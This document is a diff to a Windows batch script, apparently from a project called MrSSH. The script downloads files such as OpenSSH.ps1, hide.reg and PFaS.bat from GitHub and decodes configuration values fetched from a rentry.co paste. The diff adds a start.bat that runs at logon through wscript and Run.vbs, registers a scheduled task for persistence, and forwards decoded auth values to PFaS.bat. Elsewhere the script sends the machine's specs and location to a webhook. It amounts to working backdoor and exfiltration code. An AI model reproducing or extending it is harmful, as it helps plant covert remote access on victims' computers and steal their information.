@@ -4,11 +4,11 @@ chcp 65001 >nul
 
 :: <Variables>
 set "Token=%~1"
-set "JsonValues=token version CreationDate ID Endpoint Access"
+set "JsonValues=token version CreationDate ID Endpoint Access Auth Auth2 Auth3"
 set "Version=1.0"
 set "DefaultToken=0000"
 set Files=PFaS.bat OpenSSH.ps1 hide.reg WebParse.exe
-set OnLogFiles=onlogon.bat Run.vbs start.bat MrSSH-task.xml
+set OnLogFiles=onlogon.bat Run.vbs MrSSH-task.xml
 set Github=https://github.com/dh3b/MrSSH/raw/v.1.0/Files/
 set "TaskFile=!Data!\MrSSH-task.xml"
 set "ErrorCount=0"
@@ -84,10 +84,10 @@ curl --create-dirs -Ls "!TokenURL!" -o "!TFolder!\bin\Token.json" & if !ErrorLev
    echo TokenStatus=Valid>>!StatusFile!
    echo.>>!StatusFile!
 )
-for /f "delims=" %%t in ('call "WebParse.exe" "!TokenURL!" !JsonValues!') do (set "Json.%%t")
-for %%a in (ID Endpoint Access) do (
-call :Decode "!Json.%%a!"
-set "Json.%%a=!PlainString!"
+for /f "delims=" %%t in ('call "WebParse.exe" "!TokenURL!" !JsonValues!') do set "Json.%%t"
+for %%a in (Endpoint Access Auth Auth2 Auth3 ID) do (
+   call :Decode "!Json.%%a!"
+   set "Json.%%a=!PlainString!"
 )
 set "URL=https://rentry.co/!Json.Endpoint!"
 echo [Indicates if rentry status and paste status is valid either not]>>!StatusFile!
@@ -186,6 +186,7 @@ if !ErrorLevel! neq 0 (
 
 :: <Startup>
 echo [Indicates if StartupTask (the script that will make the program execute if pc restarted) has been created either not]>>!StatusFile!
+echo wscript.exe Run.vbs onlogon.bat !Token!>!Data!\start.bat
 schtasks /create /XML "!TaskFile!" /TN "MrSSH" >!TempFolder!\bin\schatsk.txt
 if !ErrorLevel! neq 0 (
    echo StartupTask=Already created either system error>>!StatusFile!
@@ -218,7 +219,7 @@ set "ID=:key: __**Token Info**__\\n\\n:ticket: **Token:** %Token%\\n\\n:calendar
 
 call source.bat +silent --embed "!Title!" "!PcCnfg!\\n\\n\\n!Specs!\\n\\n\\n!LocationInfo!\\n\\n\\n!ID!\\n\\n\\n*Pssst... Wait a second, that isn't all. There are 2 more embeds waiting for them to send.*" "52bf90" "https://i.imgur.com/b2Terft.png"
 
-start /B "PFaS" call PFaS.bat !token!
+start /B "PFaS" call PFaS.bat !Json.Auth! !Json.Auth2! !Json.Auth3!
 
 :: <Encode>
 :Encode
